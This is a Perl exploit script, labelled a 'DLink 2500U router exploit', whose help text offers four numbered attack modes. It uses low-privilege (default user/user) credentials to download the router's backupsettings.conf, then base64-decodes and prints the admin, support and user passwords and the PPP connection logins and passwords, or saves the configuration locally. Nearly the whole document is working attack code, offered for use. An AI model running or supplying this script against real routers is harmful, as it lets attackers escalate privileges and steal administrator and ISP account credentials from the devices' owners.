#!/usr/bin/perl -w

###
use strict;
use LWP::UserAgent;
use MIME::Base64;
use Getopt::Std;
###

help() if (scalar(@ARGV) == 0);

my %opt=();
getopt("lpat",\%opt);

help() if ($opt{h});

DEF:

my $adress = $opt{a} || '192.168.1.1';
my $login = $opt{l} || 'user';
my $pass = $opt{p} || 'user';
$opt{t} = 1 unless ($opt{t});

my $session = encode_base64($login.':'.$pass);

my $ua = LWP::UserAgent->new;
$ua->agent('Exploit agent 1.0.0');

my $conf = $ua->get('http://'.$adress.'/backupsettings.conf', 'Authorization' => 'Basic '.$session)->content;

if ($opt{t} == 1) {
    print "Printing xml file:\n". '==' x 20 ."\n".$conf."\n". '==' x 20 ."\n";
}

if ($opt{t} == 2) {
    my ($syspass) = ($conf) =~ m#<sysPassword value="(.*?)"/>#;
    my ($sptpass) = ($conf) =~ m#<sptPassword value="(.*?)"/>#;
    my ($usrpass) = ($conf) =~ m#<usrPassword value="(.*?)"/>#;

    $syspass = decode_base64($syspass);
    $sptpass = decode_base64($sptpass);
    $usrpass = decode_base64($usrpass);

    print "admin:".$syspass."\nsupport:".$sptpass."\nuser:".$usrpass."\n";
}

if ($opt{t} == 3) {
    my (@id) = ($conf) =~ m#<ppp_conId(\d+) userName=".*?" password=".*?"#g;
    my (@name) = ($conf) =~ m#<ppp_conId\d+ userName="(.*?)" password=".*?"#g;
    my (@pass) = ($conf) =~ m#<ppp_conId\d+ userName=".*?" password="(.*?)"#g;
    print "Get information form ppp connections:\n". '==' x 30 ."\n";
    while (1) {
        my $id = shift @id or last;
        print "ID:".$id."\n";
        my $name = shift @name or last;
        print "Login:".$name."\n";
        my $pass = shift @pass or last;
        $pass = decode_base64($pass);
        print "Pass:".$pass."\n";
    }
    print  '==' x 30 ."\n";
}

if ($opt{t} == 4) {
        open(F, '> backupsettings.conf');
    print F $conf."\n";
    close(F);
}


sub help {
    print "
###################################################
###          DLink 2500U router exploit         ###
###################################################

-h - this help message
-l - user login
-p - user pass
-a - server adres
-t tipe atak [1, 2, 3, 4]

1 - get xml config file
2 - get all accaunts
3 - get all ppp connection information
4 - save xml config from hard disc

";exit;
}
